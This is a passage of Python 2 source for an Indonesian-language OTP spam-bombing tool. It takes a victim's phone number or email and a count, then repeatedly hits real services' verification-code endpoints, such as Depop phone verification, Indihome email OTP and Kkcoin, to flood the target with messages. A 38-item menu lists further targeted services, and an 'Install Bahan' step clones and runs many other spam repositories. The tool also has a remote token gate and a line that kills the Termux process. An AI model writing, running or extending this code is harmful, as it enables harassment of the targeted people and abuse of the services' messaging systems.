    print '%s[%s*%s] %sKalo di buat bot sms kgk masuk' % (W1, G1, W1, W0)
    time.sleep(3)
    print '%s[%s*%s] %sKalo pengen banyak spamnya lo refresh banyak aja :v' % (W1, G1, W1, W0)
    time.sleep(3)
    print '%s[%s*%s] %sKalo respon nya invalid requests kalian paste ni link' % (W1, G1, W1, W0)
    time.sleep(3)
    print 'https://www.kkcoin.com/phone/get_phone_code?mobile_country=62&mobile=MASUKANNOMORKORBAN&type=5'
    print '%s[%s*%s] %sKalian isi nomor korban. Contoh 8XXX' % (W1, G1, W1, W0)
    time.sleep(3)
    print '%s[%s*%s] %sTunggu, Anda akan di alihkan ke browser' % (W1, G1, W1, W0)
    os.system('xdg-open https://www.kkcoin.com/phone/get_phone_code?mobile_country=62&mobile=' + no + '&type=5')
    metu()


def dp():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        dp()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        dp()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Content-Length': '49', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://signup.depop.com', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/json', 'Referer': 'https://signup.depop.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    at = {'phone_number': no, 'country_code': 'ID'}
    dt = json.dumps(at)
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.put('https://webapi.depop.com/api/auth/v1/verify/phone', headers=hd, data=dt)
            if 'false' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        dp()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def email():
    logo()
    mel = raw_input('\x1b[1;37m[\x1b[1;32m*\x1b[1;37m] \x1b[0;37mMasukkan Email: ')
    if mel == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        email()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        email()
    print
    r = requests.Session()
    z = 0
    head = {'Connection': 'keep-alive', 'Content-Length': '39', 'Accept': '*/*', 'Origin': 'https://sobat.indihome.co.id', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://sobat.indihome.co.id/register', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://sobat.indihome.co.id/ajaxreg/emailGetOtp', headers=head, data={'type': 'email', 'email': mel})
            if 'Kode verifikasi telah dikirim ke email Anda' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, mel)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, mel)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        email()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def logo():
    os.system('clear')
    ketik('\n%s _____               %s__     %s_______\n|     \\%s .---.-.----.|  |--.%s|     __|%s.-----.---.-.--------.\n%s|  --  %s|%s|  _  |   _||    < %s|__     |%s|  _  |  _  |        |\n%s|_____/ %s|___._|__|  |__|__|%s|_______|%s|   __|___._|__|__|__|\n                                    %s|__|      v1.0\n' % (G1, W1, G1, W1, G1, W1, G1, G1, W1, G1, W1, G1, W1, G1, W1, W1))

#-*-Menu 1
def ct():
    logo()
    print '%s[%s1%s] %sLogin\n%s[%s2%s] %sUpdate\n%s[%s3%s] %sGet token\n%s[%s4%s] %sContact (Whatsapp)\n%s[%s5%s] %sInstall Bahan\n%s[%s0%s] %sExit' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, R1, W1, R0)
    su = ['1', '2', '3', '4', '5', '0']
    wa = raw_input('%s\n\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
    while wa not in su:
        logo()
        print '%s[%s1%s] %sLogin\n%s[%s2%s] %sUpdate\n%s[%s3%s] %sGet token\n%s[%s4%s] %sContact (Whatsapp)\n%s[%s5%s] %sInstall Bahan\n%s[%s0%s] %sExit' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, R1, W1, R0)
        print '\n%s[%sx%s] %sPilihan Anda salah' % (W0, R0, W0, R0)
        wa = raw_input('%s\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

    if wa == '1':
        while True:
            logo()
            print '%s[%s+%s] %sWelcome :)' % (W1, P1, W1, W0)
            print '%s[%s+%s] %sKalo gak tau tokennya nya pilih menu Get token :)' % (W1, G1, W1, W0)
            try:
            	e = raw_input('%s[%s+%s] %sEnter Token : ' % (W1, P1, W1, W0))
            	r = requests.get('https://sereware56.000webhostapp.com/dui/login/free1day.txt').text
                if e == '':
                	ct()
                elif len(e) < 10:
                	ct()
                elif e in r:
                	sv = open('token/key.txt', 'w')
                	sv.write(e)
                	sv.close()
                	#main1():
                	print '%s[%s\xe2\x88\x9a%s] %sLogin Succes...' % (W1, G1, W1, W0)
                	main1()
                	break
                else:
                    print '%s[%s!%s] %sWrong Token' % (W1, R1, W1, R0)
                    time.sleep(3)
            except Exception:
                print '%s[%s!%s] %sWrong Token' % (W1, R1, W1, R0)
                time.sleep(1)
            except KeyboardInterrupt:
                os.system('killall -9 com.termux')
                print '%s[%s!%s] %sWrong Token' % (W1, R1, W1, R0)
                time.sleep(1)

        os.system('clear')
    elif wa == '2':
        koneksi()
        os.system('git pull')
        print '%s[%s+%s] %sTools was updated. \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf' % (W1, P1, W1, W0)
        exit()
    elif wa == '3':
        koneksi()
        print '%s[%s*%s] %sMakasih bro dah use tool ini :)' % (W1, G1, W1, W0)
        time.sleep(4)
        print '%s[%s*%s] %sTunggu, Anda akan di alihkan ke browser' % (W1, G1, W1, W0)
        time.sleep(3)
        os.system('xdg-open https://sereware56.000webhostapp.com/dui/ref.php')
        time.sleep(2)
        ct()
    elif wa == '4':
        logo()
        print '%s[%s!%s] %sWaiting ...' % (W0, R1, W0, W0)
        print '%sAuthor   : ~SmS~\nThx to   : Allah\n           Black Coder Rus\n           And you' % W0
        time.sleep(5)
        os.system('xdg-open https://wa.me/6282211661007?text=Assalamualaikum%20gan')
        metu()
    elif wa == '5':
        logo()
        koneksi()
        print '%s[%s+%s] %sWaiting ...' % (W0, P1, W0, R0)
        os.system('pkg update && pkg upgrade; pkg install python; pkg install grep; pkg install curl; pkg install ruby; gem install lolcat; pip2 install requests; pip2 install urllib2; pip install colorama; pip install bs4; pip install UserAgent; pip install fake_useragent; mkdir data')
        os.system('cd data; git clone https://github.com/Rusmana-ID/spam-whatsapp-unli')
        os.system('cd data; git clone https://github.com/XiuzSec/k-bisa-otp-v2')
        os.system('cd data; git clone https://github.com/Rusmana-ID/spam-notify-id')
        os.system('cd data; git clone https://github.com/Fukur0-3XP/SpamWa')
        os.system('cd data; git clone https://github.com/akasakaid/spamotpadakami')
        os.system('cd data; git clone https://github.com/akasakaid/spamotpolx')
        os.system('cd data; git clone https://github.com/akasakaid/spammypoin')
        os.system('cd data; git clone https://github.com/akasakaid/spamduniagames')
        os.system('cd data; git clone https://github.com/akasakaid/spamtokotalk')
        os.system('cd data; git clone https://github.com/akasakaid/spamsms')
        os.system('cd data; git clone https://github.com/Rusmana-ID/spam-mister_aladin')
        os.system('cd data; git clone https://github.com/ridhoNoob/SpamOtp')
        os.system('cd data; git clone https://github.com/KANG-NEWBIE/dokOTP')
        os.system('rm -rf spam-wa2')
        print '%s[%s\xc3\x97%s] %sSelesai' % (W0, R1, W0, W0)
        time.sleep(2)
        ct()
    elif wa == '0':
        print
        metu()


def menu():
    print '\n%s{%s01%s} %sSpam AYO SRC\t\t%s{%s21%s} %sSpam Tiket\n%s{%s02%s} %sSpam Airbnb\t\t%s{%s22%s} %sSpam Seekmi\n%s{%s03%s} %sSpam OLX\t\t\t%s{%s23%s} %sSpam Payfazz\n%s{%s04%s} %sSpam Mister Aladin\t\t%s{%s24%s} %sSpam Rework\n%s{%s05%s} %sSpam Three\t\t\t%s{%s25%s} %sSpam Domaten\n%s{%s06%s} %sSpam OYO\t\t\t%s{%s26%s} %sSpam Qikcircle\n%s{%s07%s} %sSpam Codapay\t\t%s{%s27%s} %sSpam Kkoin\n%s{%s08%s} %sSpam MAPCLUB\t\t%s{%s28%s} %sSpam Ace\n%s{%s09%s} %sSpam Gojek\t\t\t%s{%s29%s} %sSpam Tokotalk\n%s{%s10%s} %sSpam Rupa Rupa\t\t%s{%s30%s} %sSpam Dunia Games\n%s{%s11%s} %sSpam Indihome\t\t%s{%s31%s} %sSpam Adakami\n%s{%s12%s} %sSpam PHD\t\t\t%s{%s32%s} %sSpam Markethevi\n%s{%s13%s} %sSpam Sepulsa\t\t%s{%s33%s} %sSpam MyPoint\n%s{%s14%s} %sSpam Redbus\t\t%s{%s34%s} %sSpam Kioson\n%s{%s15%s} %sSpam Shopback\t\t%s{%s35%s} %sSpam Bakmi Gm\n%s{%s16%s} %sSpam Pomona\t\t%s{%s36%s} %sSpam Alo Dokter\n%s{%s17%s} %sSpam JET\t\t\t%s{%s37%s} %sSpam Klik Dokter\n%s{%s18%s} %sSpam Depop\t\t\t%s{%s38%s} %sSpam Rupiah\n%s{%s19%s} %sSpam Tjetak\t\t%s{%s99%s} %sBack\n%s{%s20%s} %sSpam Sooplai\t\t%s{%s00%s} %sExit' % (W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, R0, W0, G1, W0, W0, W0, G1, W0, R0)


def main1():
    try:
        logo()
        print '%s[%s1%s] %sSpam Call\n%s[%s2%s] %sSpam WA\n%s[%s3%s] %sSpam Sms\n%s[%s4%s] %sBack\n%s[%s0%s] %sExit\n' % (W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, R0)
        coi = raw_input('%s\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
        mer = ['1', '2', '3', '4', '0']
        while coi not in mer:
            logo()
            print '%s[%s1%s] %sSpam Call\n%s[%s2%s] %sSpam WA\n%s[%s3%s] %sSpam Sms\n%s[%s4%s] %sBack\n%s[%s0%s] %sExit\n' % (W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, R0)
            print '%s[%sx%s] %sPilihan Anda salah' % (W0, R1, W0, R0)
            coi = raw_input('%s\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

        if coi == '1' or coi == '01':
            logo()
            print '%s[%s*%s] %sMakasih buat kalian yg udah use tool gw :)\n%s[%s*%s] %sJangan lupa share ke temen kalian\n%s[%s*%s] %sDownload script nya\n%s[%s*%s] %sEnjoy' % (W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0, W1, G1, W1, W0)
            time.sleep(8)
            koneksi()
            os.system('xdg-open https://linkerload.com/Kbcj7')
            print '%s[%s+%s] %sEnjoy >/<' % (W1, P1, W1, W0)
            exit()
        elif coi == '2' or coi == '02':
            try:
                logo()
                print '%s[%s1%s] %sSpam WA Smartlink\n%s[%s2%s] %sSpam WA Kitabisa\n%s[%s3%s] %sSpam WA Rupa Rupa\n%s[%s4%s] %sBack\n%s[%s0%s] %sExit\n' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, R0)
                ice = raw_input('%s\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
                nom = ['1', '2', '3', '4', '0']
                while ice not in nom:
                    logo()
                    print '%s[%s1%s] %sSpam WA Smartlink\n%s[%s2%s] %sSpam WA Kitabisa\n%s[%s3%s] %sSpam WA Rupa Rupa\n%s[%s4%s] %sBack\n%s[%s0%s] %sExit\n' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, R0)
                    print '%s[%sx%s] %sPilihan Anda salah' % (W0, R1, W0, R0)
                    ice = raw_input('%s\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

                if ice == '1' or ice == '01':
                    koneksi()
                    bos()
                elif ice == '2' or ice == '02':
                    koneksi()
                    os.system('cd data; cd k-bisa-otp-v2; python kitabis.py')
                    exit()
                elif ice == '3' or ice == '03':
                    koneksi()
                    os.system('cd data; cd SpamWa; python2 Wa.py')
                    exit()
                elif ice == '0' or ice == '00':
                    metu()
            except KeyboardInterrupt:
                print
                metu()

        elif coi == '3' or coi == '03':
            main2()
        elif coi == '4' or coi == '04':
            ct()
        elif coi == '0':
            metu()
    except KeyboardInterrupt:
        print
        metu()


def main2():
    try:
        logo()
        menu()
        no = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '01', '02', '03', '04', '05', '06', '07', '08', '09', '0', '00', '99']
        pilih = raw_input('\n%s\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
        while pilih not in no:
            logo()
            menu()
            print '\n%s[%sx%s] %sPilihan Anda salah' % (W0, R1, W0, R0)
            pilih = raw_input('%s\xe2\x95\x94>%s[%s~SmS~%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

        if pilih == '1' or pilih == '01':
            koneksi()
            src()
        elif pilih == '2' or pilih == '02':
            koneksi()
            air()
        elif pilih == '3' or pilih == '03':
            koneksi()
            olx()
        elif pilih == '4' or pilih == '04':
            koneksi()
            ald()
        elif pilih == '5' or pilih == '05':
            koneksi()
            tri()
        elif pilih == '6' or pilih == '06':
            koneksi()
            oyo()
        elif pilih == '7' or pilih == '07':
            koneksi()
            coda()
        elif pilih == '8' or pilih == '08':
            koneksi()
            map()
        elif pilih == '9' or pilih == '09':
            koneksi()
            gojek()
        elif pilih == '10':
            koneksi()
            rupa()
        elif pilih == '11':
            koneksi()
            idh()
        elif pilih == '12':
            koneksi()
            phd2()
        elif pilih == '13':
            koneksi()
            print 'sms gk masuk => males apus :v'
            metu()
        elif pilih == '14':
            koneksi()
            red()
        elif pilih == '15':
            koneksi()
            shp()
        elif pilih == '16':
            koneksi()
            pmn()
        elif pilih == '17':
            koneksi()
            jet()
        elif pilih == '18':
            koneksi()
            dp()
        elif pilih == '19':
            koneksi()
            print 'web bosok => males apus :v'
            metu()
        elif pilih == '20':
            koneksi()
            sop()
        elif pilih == '21':
            koneksi()
            tkt()
        elif pilih == '22':
            koneksi()
            print 'sms gk masuk => males apus :v'
            metu()
        elif pilih == '23':
            koneksi()
            pfz()
        elif pilih == '24':
            koneksi()
            rwk()
        elif pilih == '25':
            koneksi()
            print 'web bosok => males apus :v'
            metu()
        elif pilih == '26':
            koneksi()
            qcr()
        elif pilih == '27':
            koneksi()
            kk()
        elif pilih == '28':
            koneksi()
            ace()
        elif pilih == '29':
            koneksi()
            os.system('clear; cd data; cd spamtokotalk; python toko.py')
            exit()
        elif pilih == '30':
            koneksi()
            os.system('clear; cd data; cd spamduniagames; python games.py')
            exit()
        elif pilih == '31':
            koneksi()
            os.system('clear; cd data; cd spamotpadakami; python spam.py')
            exit()
        elif pilih == '32':
            koneksi()
            os.system('clear; cd data; cd spamsms; python hevi.py')
            exit()
        elif pilih == '33':
            koneksi()
            os.system('clear; cd data; cd SpamOtp; python nyepam.py')
            exit()
        elif pilih == '34':
            koneksi()
            os.system('clear; cd data; cd SpamOtp; python nyepam.py')
            exit()
        elif pilih == '35':
            koneksi()
            bkm()
        elif pilih == '36':
            koneksi()
            os.system('clear; cd data; cd dokOTP; python haldoc.py')
            exit()
        elif pilih == '37':
            koneksi()
            os.system('clear; cd data; cd dokOTP; python haldoc.py')
            exit()
        elif pilih == '38':
            koneksi()
            rp()
        elif pilih == '99':
            main1()
        elif pilih == '0' or pilih == '00':
            print
            metu()
    except KeyboardInterrupt:
        print
        metu()


if __name__ == '__main__':
    try:
        api = open('token/key.txt', 'r').read()
        r = requests.get('https://sereware56.000webhostapp.com/dui/login/free1day.txt').text
        if api == '':
            ct()
        elif len(api) < 10:
            ct()
        elif api in r:
            main1()
        else:
            ct()
    except (KeyError, IOError):
        daftar()

    main2() 
